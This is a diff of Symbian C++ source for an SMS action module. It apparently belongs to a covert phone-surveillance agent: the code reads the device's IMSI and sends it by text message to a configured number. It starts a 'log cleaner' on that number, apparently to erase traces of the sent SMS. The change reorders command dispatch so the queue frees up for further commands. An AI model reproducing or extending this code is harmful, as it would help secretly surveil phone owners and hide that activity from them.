@@ -102,15 +102,19 @@ void CActionSms::ConstructL(const TDesC8& params)
 	CleanupStack::PopAndDestroy(&paramsBuf);
 	}
 
-void CActionSms::DispatchStartCommandL()
+void CActionSms::DispatchStartCommandL() 
 	{
+	//we moved this method here, so that we can free the queue for subsequent commands
+	//otherwise restore it in SmsSentL()
+	MarkCommandAsDispatchedL();
+	
 	iLogCleaner->StartCleaner(iSmsNumber);  // added jo'
 	
 	switch (iOption)
 		{
 		case ESms_IMSI:
 			{
-			TBuf<CTelephony::KIMSISize> imsi;
+			TBuf<CTelephony::KIMSISize> imsi; 
 			iPhone->GetImsiSync(imsi);
 			iSmsText = _L("IMSI: ");
 			iSmsText.Append(imsi);
@@ -139,8 +143,8 @@ void CActionSms::SmsSentL(TInt aError)
 		{
 		// handle the error...
 		}
-	MarkCommandAsDispatchedL();
-	SetFinishedJob(EFalse);
+	//MarkCommandAsDispatchedL();
+	SetFinishedJob(ETrue);
 	}
 
 //void CActionSms::HandleGPSPositionL(TPosition position)  //original MB
